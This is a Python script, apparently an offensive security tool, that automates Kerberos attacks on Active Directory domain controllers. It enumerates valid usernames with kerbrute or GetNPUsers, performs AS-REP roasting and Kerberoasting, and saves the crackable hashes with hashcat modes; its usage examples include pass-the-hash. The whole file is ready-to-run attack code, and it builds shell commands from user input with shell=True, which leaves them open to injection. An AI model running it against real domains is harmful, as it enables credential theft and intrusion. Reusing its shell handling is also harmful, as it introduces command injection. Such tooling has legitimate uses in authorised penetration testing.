#!/usr/bin/env python3
"""check_kerberos.py - Kerberos user enumeration, AS-REP roasting and Kerberoasting"""

import argparse
import os
import re
import shutil
import subprocess
import sys
from datetime import datetime
from pathlib import Path

# ---------------------------------------------------------------------------
# Colours & logging
# ---------------------------------------------------------------------------

class C:
    HEADER = '\033[95m'
    CYAN   = '\033[96m'
    GREEN  = '\033[92m'
    WARN   = '\033[93m'
    FAIL   = '\033[91m'
    ENDC   = '\033[0m'
    BOLD   = '\033[1m'


def log_info(msg): print(f"{C.CYAN}[*]{C.ENDC} {msg}")
def log_ok(msg):   print(f"{C.GREEN}[+]{C.ENDC} {msg}")
def log_warn(msg): print(f"{C.WARN}[!]{C.ENDC} {msg}")
def log_err(msg):  print(f"{C.FAIL}[X]{C.ENDC} {msg}")
def log_step(msg): print(f"\n{C.HEADER}{C.BOLD}{'='*60}\n  {msg}\n{'='*60}{C.ENDC}")


# ---------------------------------------------------------------------------
# Built-in common AD username wordlist
# ---------------------------------------------------------------------------

COMMON_AD_USERS = [
    "administrator", "admin", "guest", "krbtgt", "backup", "helpdesk",
    "support", "service", "svc", "svcadmin", "serviceaccount",
    "it", "itadmin", "sysadmin", "webmaster", "test", "dev",
    "developer", "sql", "sqlservice", "exchange", "sharepoint",
    "operator", "monitor", "scanner", "security", "audit",
    "readonly", "viewer", "reporter", "manager", "user", "vpn",
    "remote", "backup", "sa", "oracle", "postgres", "mysql",
]

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def run(cmd: str, timeout: int = 300):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout, r.stderr, r.returncode
    except subprocess.TimeoutExpired:
        return "", "TIMEOUT", 1


def tool_exists(name: str) -> bool:
    return shutil.which(name) is not None


def write_list(path: Path, items):
    """Write a sorted, deduplicated list to a file."""
    unique = sorted(set(i.strip() for i in items if i.strip()))
    path.write_text("\n".join(unique) + ("\n" if unique else ""))
    return unique


def resolve_targets(target: str) -> list[str]:
    """Return a list of IPs/hostnames from a file, single IP, or CIDR."""
    p = Path(target)
    if p.is_file():
        return [l.strip() for l in p.read_text().splitlines() if l.strip() and not l.startswith("#")]
    return [target]


def build_cred_args(username: str, password: str | None, hash_: str | None, domain: str | None) -> str:
    """Return nxc credential arguments."""
    args = f"-u '{username}'"
    if hash_:
        args += f" -H '{hash_}'"
    elif password is not None:
        args += f" -p '{password}'"
    if domain:
        args += f" -d '{domain}'"
    return args


# ---------------------------------------------------------------------------
# Steps
# ---------------------------------------------------------------------------

def step1_domain_detection(hosts: list[str], out: Path, domain: str | None) -> str | None:
    """Try to detect domain from DC hostname via nxc smb."""
    log_step("STEP 1 — Domain detection")
    if domain:
        log_info(f"Domain provided: {domain}")
        return domain

    if not hosts:
        log_warn("No hosts — skipping domain detection")
        return None

    dc_ip = hosts[0]
    if tool_exists("nxc"):
        stdout, _, _ = run(f"nxc smb {dc_ip} 2>/dev/null", timeout=30)
        m = re.search(r'domain:([^\s\)]+)', stdout, re.IGNORECASE)
        if m:
            detected = m.group(1).strip()
            log_ok(f"Detected domain: {detected}")
            (out / "krb_domain_info.txt").write_text(detected + "\n")
            return detected
    log_warn("Could not auto-detect domain. Use -d to specify it.")
    return None


def step2_user_enum(hosts: list[str], out: Path, domain: str | None, wordlist: str | None):
    """Enumerate valid Kerberos users via kerbrute or GetNPUsers."""
    log_step("STEP 2 — User enumeration via Kerberos")
    if not domain:
        log_warn("Domain required for user enumeration — skipping (use -d)")
        return

    if not hosts:
        log_warn("No hosts — skipping user enumeration")
        return

    # Build wordlist
    wl_path = Path("/tmp/_krb_users.txt")
    if wordlist and Path(wordlist).is_file():
        wl_path = Path(wordlist)
    else:
        wl_path.write_text("\n".join(COMMON_AD_USERS) + "\n")
        log_info(f"Using built-in wordlist ({len(COMMON_AD_USERS)} usernames)")

    dc_ip = hosts[0]
    valid_file = out / "kerberos_valid_users.txt"

    if tool_exists("kerbrute"):
        log_info(f"Running kerbrute userenum against {dc_ip}")
        stdout, stderr, _ = run(
            f"kerbrute userenum --dc {dc_ip} -d {domain} {wl_path} 2>&1",
            timeout=120,
        )
        (out / "kerbrute_raw.txt").write_text(stdout + stderr)
        valid = re.findall(r'VALID USERNAME:\s+(\S+)', stdout)
        if valid:
            write_list(valid_file, valid)
            log_ok(f"Found {len(valid)} valid users → {valid_file}")
        else:
            log_info("No valid users found via kerbrute")
        return

    # Fallback: GetNPUsers without hash request just to validate users
    getnpusers = shutil.which("GetNPUsers.py") or shutil.which("impacket-GetNPUsers")
    if getnpusers:
        log_info(f"Running {getnpusers} for user validation")
        stdout, stderr, _ = run(
            f"python3 {getnpusers} {domain}/ -dc-ip {dc_ip} -no-pass -usersfile {wl_path} 2>&1",
            timeout=180,
        )
        (out / "getnpusers_enum_raw.txt").write_text(stdout + stderr)
        valid = re.findall(r'\$krb5asrep\$[^\s]+', stdout)
        users_from_errors = re.findall(r'User (\S+) doesn\'t have UF_DONT_REQUIRE_PREAUTH', stdout)
        all_valid = valid + users_from_errors
        if all_valid:
            write_list(valid_file, all_valid)
            log_ok(f"Validated {len(all_valid)} users → {valid_file}")
        return

    log_warn("Neither kerbrute nor GetNPUsers.py found — skipping user enumeration")
    log_warn("Install: pip install impacket  OR  apt install kerbrute")


def step3_asrep_roast(hosts: list[str], out: Path, domain: str | None,
                      username: str | None, password: str | None,
                      hash_: str | None, users_file: str | None):
    """AS-REP roasting — accounts without Kerberos pre-auth."""
    log_step("STEP 3 — AS-REP Roasting")
    if not domain:
        log_warn("Domain required for AS-REP roasting — skipping (use -d)")
        return
    if not hosts:
        log_warn("No hosts — skipping AS-REP roasting")
        return

    dc_ip = hosts[0]
    hash_file = out / "kerberos_asrep_hashes.txt"

    # With credentials → use nxc ldap --asreproast
    if (username and (password is not None or hash_)) and tool_exists("nxc"):
        creds = build_cred_args(username, password, hash_, domain)
        log_info(f"AS-REP roasting via nxc ldap (authenticated)")
        stdout, _, _ = run(
            f"nxc ldap {dc_ip} {creds} --asreproast {hash_file} 2>&1",
            timeout=120,
        )
        (out / "nxc_asreproast_raw.txt").write_text(stdout)
        if hash_file.exists() and hash_file.stat().st_size > 0:
            count = len(hash_file.read_text().splitlines())
            log_ok(f"Captured {count} AS-REP hash(es) → {hash_file}  [hashcat -m 18200]")
        else:
            log_info("No AS-REP hashes found (all accounts have pre-auth enabled)")
        return

    # Without credentials → use GetNPUsers against known users
    getnpusers = shutil.which("GetNPUsers.py") or shutil.which("impacket-GetNPUsers")
    if not getnpusers:
        log_warn("GetNPUsers.py not found — skipping AS-REP roasting")
        log_warn("Install: pip install impacket")
        return

    # Determine user list
    if users_file and Path(users_file).is_file():
        uf = users_file
    elif (out / "kerberos_valid_users.txt").exists():
        uf = str(out / "kerberos_valid_users.txt")
    else:
        uf = None

    if not uf:
        log_warn("No user list available for unauthenticated AS-REP roasting (run step 2 first or use --users)")
        return

    log_info(f"Running GetNPUsers against {dc_ip} with user list {uf}")
    stdout, stderr, _ = run(
        f"python3 {getnpusers} {domain}/ -dc-ip {dc_ip} -no-pass -usersfile {uf} -format hashcat 2>&1",
        timeout=180,
    )
    (out / "getnpusers_asrep_raw.txt").write_text(stdout + stderr)
    hashes = re.findall(r'\$krb5asrep\$[^\s]+', stdout)
    if hashes:
        write_list(hash_file, hashes)
        log_ok(f"Captured {len(hashes)} AS-REP hash(es) → {hash_file}  [hashcat -m 18200]")
    else:
        log_info("No AS-REP hashes found")


def step4_kerberoast(hosts: list[str], out: Path, domain: str | None,
                     username: str | None, password: str | None, hash_: str | None):
    """Kerberoasting — accounts with SPNs."""
    log_step("STEP 4 — Kerberoasting")
    if not (username and domain):
        log_warn("Kerberoasting requires credentials (-u/-p/-H -d) — skipping")
        return
    if not hosts:
        log_warn("No hosts — skipping Kerberoasting")
        return

    dc_ip = hosts[0]
    spn_file = out / "kerberos_spn_hashes.txt"

    # Prefer nxc ldap
    if tool_exists("nxc"):
        creds = build_cred_args(username, password, hash_, domain)
        log_info("Kerberoasting via nxc ldap")
        stdout, _, _ = run(
            f"nxc ldap {dc_ip} {creds} --kerberoasting {spn_file} 2>&1",
            timeout=120,
        )
        (out / "nxc_kerberoast_raw.txt").write_text(stdout)
        if spn_file.exists() and spn_file.stat().st_size > 0:
            count = len(spn_file.read_text().splitlines())
            log_ok(f"Captured {count} SPN hash(es) → {spn_file}  [hashcat -m 13100]")
        else:
            log_info("No Kerberoastable accounts found")
        return

    # Fallback: GetUserSPNs.py
    getspns = shutil.which("GetUserSPNs.py") or shutil.which("impacket-GetUserSPNs")
    if not getspns:
        log_warn("Neither nxc nor GetUserSPNs.py found — skipping Kerberoasting")
        return

    cred_str = f"{domain}/{username}"
    if hash_:
        cred_str += f" -hashes {hash_}"
    elif password is not None:
        cred_str += f":{password}"

    log_info(f"Running {getspns}")
    stdout, stderr, _ = run(
        f"python3 {getspns} {cred_str} -dc-ip {dc_ip} -request -format hashcat 2>&1",
        timeout=180,
    )
    (out / "getuserspns_raw.txt").write_text(stdout + stderr)
    hashes = re.findall(r'\$krb5tgs\$[^\s]+', stdout)
    if hashes:
        write_list(spn_file, hashes)
        log_ok(f"Captured {len(hashes)} SPN hash(es) → {spn_file}  [hashcat -m 13100]")
    else:
        log_info("No Kerberoastable accounts found")


def write_summary(out: Path, hosts: list[str], domain: str | None):
    """Write human-readable summary."""
    lines = [
        "Kerberos Check Summary",
        "=" * 40,
        f"Date   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"Targets: {len(hosts)} host(s)",
        f"Domain : {domain or 'unknown'}",
        "",
    ]
    for fname, label, critical in [
        ("kerberos_valid_users.txt",  "Valid users found",      False),
        ("kerberos_asrep_hashes.txt", "AS-REP hashes (m18200)", True),
        ("kerberos_spn_hashes.txt",   "SPN hashes (m13100)",    True),
    ]:
        p = out / fname
        if p.exists():
            count = len([l for l in p.read_text().splitlines() if l.strip()])
            tag = " [CRITICAL]" if critical and count > 0 else ""
            lines.append(f"  {label}: {count}{tag}")
        else:
            lines.append(f"  {label}: 0")

    summary = "\n".join(lines) + "\n"
    (out / "kerberos_summary.txt").write_text(summary)
    print(f"\n{C.BOLD}{summary}{C.ENDC}")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="check_kerberos.py — Kerberos user enumeration, AS-REP roasting & Kerberoasting",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Required tools (install as needed):
  nxc (netexec)        : apt install netexec
  kerbrute             : https://github.com/ropnop/kerbrute/releases
  impacket             : pip install impacket

Examples:
  # Unauthenticated user enum + AS-REP
  python3 check_kerberos.py -t hosts_kerberos.txt -d corp.local

  # Authenticated full scan (AS-REP + Kerberoast)
  python3 check_kerberos.py -t 192.168.1.10 -d corp.local -u jdoe -p 'P@ss123'

  # Pass-the-hash Kerberoasting
  python3 check_kerberos.py -t dc01.corp.local -d corp.local -u admin -H aad3b435b51404eeaad3b435b51404ee:xxxxxx
""",
    )
    parser.add_argument("-t", "--target",   required=True,
                        help="Host file, single IP, or hostname")
    parser.add_argument("-o", "--output",   default=None,
                        help="Output directory (default: ./kerberos_results_<ts>)")
    parser.add_argument("-u", "--username", default=None, help="Username")
    parser.add_argument("-p", "--password", default=None, help="Password")
    parser.add_argument("-H", "--hash",     default=None, help="NTLM hash LM:NT")
    parser.add_argument("-d", "--domain",   default=None, help="Domain FQDN (e.g. corp.local)")
    parser.add_argument("--users",          default=None, help="File with usernames for AS-REP roasting")
    parser.add_argument("--wordlist",       default=None, help="Wordlist for user enumeration")

    args = parser.parse_args()

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out = Path(args.output) if args.output else Path(f"kerberos_results_{ts}")
    out.mkdir(parents=True, exist_ok=True)

    log_info(f"Output directory: {out}")

    # Check tools
    for tool, pkg in [("nxc", "netexec"), ("kerbrute", "kerbrute binary")]:
        if not tool_exists(tool):
            log_warn(f"'{tool}' not found — some checks will be skipped ({pkg})")

    hosts = resolve_targets(args.target)
    if not hosts:
        log_warn("No hosts to scan — exiting")
        sys.exit(0)

    log_info(f"Targets: {len(hosts)} host(s)")

    domain = step1_domain_detection(hosts, out, args.domain)
    step2_user_enum(hosts, out, domain, args.wordlist)
    step3_asrep_roast(hosts, out, domain, args.username, args.password, args.hash, args.users)
    step4_kerberoast(hosts, out, domain, args.username, args.password, args.hash)
    write_summary(out, hosts, domain)


if __name__ == "__main__":
    main()
